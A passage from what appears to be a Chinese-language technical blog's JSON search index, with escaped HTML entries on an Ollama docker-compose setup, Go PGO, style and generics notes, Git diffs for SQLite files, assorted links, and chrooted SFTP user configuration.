[gpu]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eollama-webui\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eghcr.io/ollama-webui/ollama-webui:main\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003econtainer_name\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eollama-webui\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003erestart\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eunless-stopped\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evolumes\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e./ollama/ollama-webui:/app/backend/data\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8080\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eenvironment\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/ollama/api=http://ollama:11434/api\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eextra_hosts\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003ehost.docker.internal:host-gateway\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eollama-docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eollama-docker\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"setup\"\u003eSetup\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Run docker-compose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-compose up -d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Pull model(https://ollama.com/library)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker exec -it ollama /bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eollama pull llama3\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"chat-with-web-ui\"\u003eChat with Web-UI\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003eport defined in docker-compose.yml ollama-webui.ports\u003c/p\u003e","tags":["Go","URL","ollama"],"title":"Run llama3"},{"categories":["Go","URL"],"contents":" 一文读不懂的 Go 1.21 GA 的 PGO 优化——一次在 WebP Server Go 上的尝试 ","date":"April 25, 2024","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240425-pgo/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.webp.se/go-121-pgo-zh/\" target=\"_blank\" rel=\"noopener\"\u003e一文读不懂的 Go 1.21 GA 的 PGO 优化——一次在 WebP Server Go 上的尝试\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["Go","URL"],"title":"一文读不懂的 Go 1.21 GA 的 PGO 优化——一次在 WebP Server Go 上的尝试"},{"categories":["Go","URL"],"contents":" Go Style Decisions - Pass values 不要僅僅為了節省一些位元組而將指標作為函數參數傳遞。如果函數始終將其參數 x 讀取為 *x，則該參數不應該是指標。常見的實例包括傳遞指向字串的指標 (*string) 或指向介面值的指標 (*io.Reader)。在這兩種情況下，值本身都是固定大小的，可以直接傳遞。\n此建議不適用於大型結構，甚至不適用於可能增加大小的小型結構。特別是，協定緩衝區訊息通常應透過指標而不是值來處理。指標類型滿足 proto.Message 介面（被 proto.Marshal 、 protocmp.Transform 等接受），且協定緩衝區訊息可能非常大，並且通常會隨著時間的推移而變得更大。\n","date":"April 13, 2024","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240413-decisions-pass-values/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://google.github.io/styleguide/go/decisions.html#pass-values\" target=\"_blank\" rel=\"noopener\"\u003eGo Style Decisions - Pass values\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e不要僅僅為了節省一些位元組而將指標作為函數參數傳遞。如果函數始終將其參數 \u003ccode\u003ex\u003c/code\u003e 讀取為 \u003ccode\u003e*x\u003c/code\u003e，則該參數不應該是指標。常見的實例包括傳遞指向字串的指標 (\u003ccode\u003e*string\u003c/code\u003e) 或指向介面值的指標 (\u003ccode\u003e*io.Reader\u003c/code\u003e)。在這兩種情況下，值本身都是固定大小的，可以直接傳遞。\u003c/p\u003e\n\u003cp\u003e此建議不適用於大型結構，甚至不適用於可能增加大小的小型結構。特別是，協定緩衝區訊息通常應透過指標而不是值來處理。指標類型滿足 \u003ccode\u003eproto.Message\u003c/code\u003e 介面（被 \u003ccode\u003eproto.Marshal\u003c/code\u003e 、 \u003ccode\u003eprotocmp.Transform\u003c/code\u003e 等接受），且協定緩衝區訊息可能非常大，並且通常會隨著時間的推移而變得更大。\u003c/p\u003e","tags":["Go","URL"],"title":"Go Style Decisions - Pass values"},{"categories":["URL","Go"],"contents":" GO Generic 入門筆記 自定義約束 // Addable只允許int 或 float64類型 type Addable interface { int | float64 } func Add[T Addable](a, b T) T { return a + b } ~ 符號的作用 ~ 符號用于表示與指定类型有相同底層類型的所有類型。當你在類型參數的约束中使用 ~ 符號時，你指定了一個類型集合，這個集合包含所有底層類型與约束中指定的類型相同的類型。\ntype MyInt int type YourInt int func PrintInt[T ~int](t T) { fmt.Println(t) } func main() { var a int = 5 var b MyInt = 10 var c YourInt = 15 PrintInt(a) PrintInt(b) PrintInt(c) } ","date":"February 7, 2024","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240207-go-generic/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ganhua.wang/go-generic\" target=\"_blank\" rel=\"noopener\"\u003eGO Generic 入門筆記\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"自定義約束\"\u003e自定義約束\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// Addable只允許int 或 float64類型\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eAddable\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e | \u003cspan style=\"color:#66d9ef\"\u003efloat64\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eAddable\u003c/span\u003e](\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cstrong\u003e\u003cem\u003e\u003ccode\u003e~\u003c/code\u003e 符號的作用\u003c/em\u003e\u003c/strong\u003e\n\u003ccode\u003e~\u003c/code\u003e 符號用于表示與指定类型有相同底層類型的所有類型。當你在類型參數的约束中使用 \u003ccode\u003e~\u003c/code\u003e 符號時，你指定了一個類型集合，這個集合包含所有底層類型與约束中指定的類型相同的類型。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eMyInt\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eYourInt\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePrintInt\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e ~\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e](\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eMyInt\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eYourInt\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ePrintInt\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ePrintInt\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ePrintInt\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go"],"title":"GO Generic 入門筆記"},{"categories":["URL","Git"],"contents":" Tracking SQLite Database Changes in Git Git hook for diff sqlite table First, add a diff type called \u0026ldquo;sqlite3\u0026rdquo; to your config. The simplest way is to just run these commands:\ngit config diff.sqlite3.binary true git config diff.sqlite3.textconv \u0026#34;echo .dump | sqlite3\u0026#34; Alternatively, you can add this snippet to your ~/.gitconfig or .git/config in your repository:\n[diff \u0026#34;sqlite3\u0026#34;] binary = true textconv = \u0026#34;echo .dump | sqlite3\u0026#34; Next, create a file called .gitattributes if it\u0026rsquo;s not already present and add this line:\n*.sqlite diff=sqlite3 Note that the filename (*.sqlite) may differ from your setup. In my case for example, it should match files with *.gnucash.\nAnd that\u0026rsquo;s about it! The next time you run git diff or any other command that produces a diff on a sqlite file, you\u0026rsquo;ll see a nicely formatted diff of the changes.\n","date":"February 7, 2024","hero":"/images/hero/git.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240207-tracking_sqlite_database_changes_git/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://lobste.rs/s/gnv9ho/tracking_sqlite_database_changes_git\" target=\"_blank\" rel=\"noopener\"\u003eTracking SQLite Database Changes in Git\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://stackoverflow.com/a/21789167\" target=\"_blank\" rel=\"noopener\"\u003eGit hook for diff sqlite table\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFirst, add a diff type called \u0026ldquo;sqlite3\u0026rdquo; to your config. The simplest way is to just run these commands:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit config diff.sqlite3.binary true git config diff.sqlite3.textconv \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;echo .dump | sqlite3\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAlternatively, you can add this snippet to your \u003ccode\u003e~/.gitconfig\u003c/code\u003e or \u003ccode\u003e.git/config\u003c/code\u003e in your repository:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-gitconfig\" data-lang=\"gitconfig\"\u003e[diff \u0026#34;sqlite3\u0026#34;] binary = true textconv = \u0026#34;echo .dump | sqlite3\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eNext, create a file called \u003ccode\u003e.gitattributes\u003c/code\u003e if it\u0026rsquo;s not already present and add this line:\u003c/p\u003e","tags":["URL","Git"],"title":"Tracking SQLite Database Changes in Git"},{"categories":["llm","visualization","machinelearning","URL"],"contents":" LLM Visualization Github ","date":"January 21, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240121-llm/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://bbycroft.net/llm\" target=\"_blank\" rel=\"noopener\"\u003eLLM Visualization\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/bbycroft/llm-viz\" target=\"_blank\" rel=\"noopener\"\u003eGithub\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["llm","visualization","machinelearning","URL"],"title":"LLM Visualization"},{"categories":["URL","MQTT","EMQX"],"contents":" Tuning EMQX to Scale to One Million Concurrent Connection on Kubernetes ","date":"January 21, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240121-scale-emqx-one-million-connections-kubernetes/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.infracloud.io/blogs/scale-emqx-one-million-connections-kubernetes/\" target=\"_blank\" rel=\"noopener\"\u003eTuning EMQX to Scale to One Million Concurrent Connection on Kubernetes\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","MQTT","EMQX"],"title":"Tuning EMQX to Scale to One Million Concurrent Connection on Kubernetes"},{"categories":["URL"],"contents":" llamafile - Distribute and run LLMs with a single file. Bash One-Liners for LLMs ","date":"January 21, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240121-llamafile/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/mozilla-Ocho/llamafile\" target=\"_blank\" rel=\"noopener\"\u003ellamafile - Distribute and run LLMs with a single file.\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://justine.lol/oneliners/\" target=\"_blank\" rel=\"noopener\"\u003eBash One-Liners for LLMs\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL"],"title":"llamafile - Distribute and run LLMs with a single file."},{"categories":["URL","Database"],"contents":" Database Fundamentals ","date":"January 1, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240101-database-fundementals/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://tontinton.com/posts/database-fundementals/\" target=\"_blank\" rel=\"noopener\"\u003eDatabase Fundamentals\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Database"],"title":"Database Fundamentals"},{"categories":["URL","Terraform"],"contents":" Terraform Provider 開發紀錄 ","date":"December 28, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221228-terraform-provider-development/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://hazel.style/2022/12/06/Terraform-Provider-Development/\" target=\"_blank\" rel=\"noopener\"\u003eTerraform Provider 開發紀錄\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Terraform"],"title":"Terraform Provider 開發紀錄"},{"categories":["Python","snow","terminal","URL"],"contents":" A python script that allows your terminal to snow. docker run --rm -ti sontek/snowmachine tree --color rainbow --particle \u0026#34;*\u0026#34; --snow true --lights-color rainbow ","date":"December 24, 2023","hero":"/images/hero/python.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20231224-snow/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/sontek/snowmachine\" target=\"_blank\" rel=\"noopener\"\u003eA python script that allows your terminal to snow.\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker run --rm -ti sontek/snowmachine tree --color rainbow --particle \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e --snow true --lights-color rainbow\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["Python","snow","terminal","URL"],"title":"A python script that allows your terminal to snow."},{"categories":["SSH","SFTP","Linux"],"contents":"Add SFTP user and share directory dev_test_user, qa_test_user 同權限 dev_user, qa_user 同權限\n1. 建立共享資料夾(SFTP 使用的資料夾) sudo mkdir -p /home/{test,prod}/{exchange,upload} sudo mkdir -p /home/{test,prod}/exchange/success sudo mkdir -p /home/{test,prod}/upload/backup 2. 建立使用者群組 sudo groupadd share01-test sudo groupadd share01-prod 3. 創建 qa_test_user 使用者並設定 qa_test_user 使用者的群組為 share01-test sudo useradd -m -G share01-test qa_test_user # 設定 dev_test_user 使用者的群組為 share01-test sudo usermod -G share01-test dev_test_user # 設定密碼 sudo passwd qa_test_user 4. 創建 qa_user 使用者並設定 qa_user 使用者的群組為 share01-prod sudo useradd -m -G share01-prod qa_user # 設定 dev_user 使用者的群組為 share01-prod sudo usermod -G share01-prod dev_user # 設定密碼 sudo passwd qa_user 5. 設定權限 # 設定 /home/test 資料夾(含下級資料夾)的使用者為 qa_test_user，群組為 share01-test sudo chown -R qa_test_user:share01-test test/ # 設定 /home/prod 資料夾(含下級資料夾)的使用者為 qa_user，群組為 share01-prod sudo chown -R qa_user:share01-prod prod/ # SFTP 登入資料夾權限要給 root sudo chown root:root /home/test sudo chown root:root /home/prod 6. 設定 /etc/ssh/sshd_config /etc/ssh/sshd_config\n# 在最底下增加設定 Match group share01-test ChrootDirectory /home/test X11Forwarding no AllowTcpForwarding no ForceCommand internal-sftp -d /upload Match group share01-prod ChrootDirectory /home/prod X11Forwarding no AllowTcpForwarding no ForceCommand internal-sftp -d /upload # 重新啟動 sshd 讓設定生效 sudo systemctl restart sshd.service ","date":"November 30, 2023","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20231130-sftp/","summary":"\u003ch1 id=\"add-sftp-user-and-share-directory\"\u003eAdd SFTP user and share directory\u003c/h1\u003e\n\u003cp\u003edev_test_user, qa_test_user 同權限\ndev_user, qa_user 同權限\u003c/p\u003e\n\u003ch2 id=\"1-建立共享資料夾sftp-使用的資料夾\"\u003e1. 建立共享資料夾(SFTP 使用的資料夾)\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo mkdir -p /home/\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003etest,prod\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e/\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003eexchange,upload\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo mkdir -p /home/\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003etest,prod\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e/exchange/success\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo mkdir -p /home/\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003etest,prod\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e/upload/backup\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"2-建立使用者群組\"\u003e2. 建立使用者群組\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo groupadd share01-test\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo groupadd share01-prod\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"3-創建-qa_test_user-使用者並設定-qa_test_user-使用者的群組為-share01-test\"\u003e3. 創建 qa_test_user 使用者並設定 qa_test_user 使用者的群組為 share01-test\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo useradd -m -G share01-test qa_test_user\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定 dev_test_user 使用者的群組為 share01-test\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo usermod -G share01-test dev_test_user\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定密碼\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo passwd qa_test_user\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"4-創建-qa_user-使用者並設定-qa_user-使用者的群組為-share01-prod\"\u003e4. 創建 qa_user 使用者並設定 qa_user 使用者的群組為 share01-prod\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo useradd -m -G share01-prod qa_user\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定 dev_user 